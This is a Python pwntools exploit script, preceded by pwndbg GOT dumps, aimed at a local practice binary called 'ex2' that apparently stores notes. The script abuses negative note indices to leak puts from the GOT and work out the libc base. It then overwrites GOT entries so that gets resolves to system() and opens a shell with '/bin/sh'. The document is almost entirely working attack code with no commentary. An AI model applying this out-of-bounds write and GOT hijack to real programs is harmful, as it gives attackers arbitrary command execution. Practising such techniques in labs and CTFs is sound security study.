'''
got:
[0x555555558000] puts@GLIBC_2.2.5 -> 0x7ffff7e2cbd0 (puts) ◂— endbr64 
[0x555555558008] __stack_chk_fail@GLIBC_2.4 -> 0x555555555040 ◂— endbr64 
[0x555555558010] printf@GLIBC_2.2.5 -> 0x7ffff7e050f0 (printf) ◂— endbr64 
[0x555555558018] gets@GLIBC_2.2.5 -> 0x7ffff7e2c070 (gets) ◂— endbr64 
[0x555555558020] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7e04e00 (__isoc99_scanf) ◂— endbr64 
[0x555555558028] getc@GLIBC_2.2.5 -> 0x7ffff7e33f60 (getc) ◂— endbr64

p &NOTES[-3]
$1 = (char (*)[16]) 0x555555558030
pwndbg> p &NOTES[-4]
$2 = (char (*)[16]) 0x555555558020 <__isoc99_scanf@got.plt>
pwndbg> p &NOTES[-5]
$3 = (char (*)[16]) 0x555555558010 <printf@got[plt]>
pwndbg> p &NOTES[-6]
$4 = (char (*)[16]) 0x555555558000 <puts@got[plt]>
'''

from pwn import *

target = process("./bin/ex2")
elf = context.binary = ELF("./bin/ex2", checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

output = target.recvlines(6)
log.info("output: %s" % output)
target.sendline("2")
target.sendline("-6")

output = target.recvline()
output = output.strip()
output = output[-6:] + b'\0\0'
output = u64(output)
print(hex(output))

puts_int = output
target.recvline()
libc.address = puts_int - libc.sym["puts"]
log.info("LIBC base address: %s" % hex(libc.address))

system_addr = libc.sym["system"]
log.info("system address: %s" % hex(system_addr))

getc_real_addr = libc.sym["getc"] 
log.info("getc address: %s" % hex(getc_real_addr))
printf_real_addr = libc.sym["printf"]
log.info("printf address: %s" % hex(printf_real_addr))
scanf_real_addr = libc.sym["__isoc99_scanf"]
log.info("scanf address: %s" % hex(scanf_real_addr))

# [*] system() address: 0x7ffff7dfd740
# bytes: 40 d7 df f7 ff 7f 00 00

# Overwrite gets@GOT with system()
# got_offset = (printf_address_pointer - notes_start) // NOTE_SIZE
# log.info("Offset for gets@GOT: %d" % got_offset)

target.recvline(b"Choose option: ")
target.sendline(b"1")
target.recvline(b"Input the index for your secure note: ")
target.sendline(b"0")
target.recvline(b"Input your note: ")
target.sendline(b"/bin/sh")

target.recvline(b"Choose option: ")
target.sendline(b"1")
target.recvline(b"Input the index for your secure note: ")
target.sendline(str(-5))
target.recvline(b"Input your note: ")
# gdb.attach(target)
payload = p64(printf_real_addr) + p64(system_addr)[:7]
# + p64(scanf_real_addr)
# + p64(getc_real_addr)
   
target.sendline(payload)

target.recvline(b"Choose option: ")
target.sendline(b"1")
target.recvline(b"Input the index for your secure note: ")
target.sendline(b"0")
target.recvline(b"Input your note: ")
target.sendline(b"/bin/sh")

target.interactive()
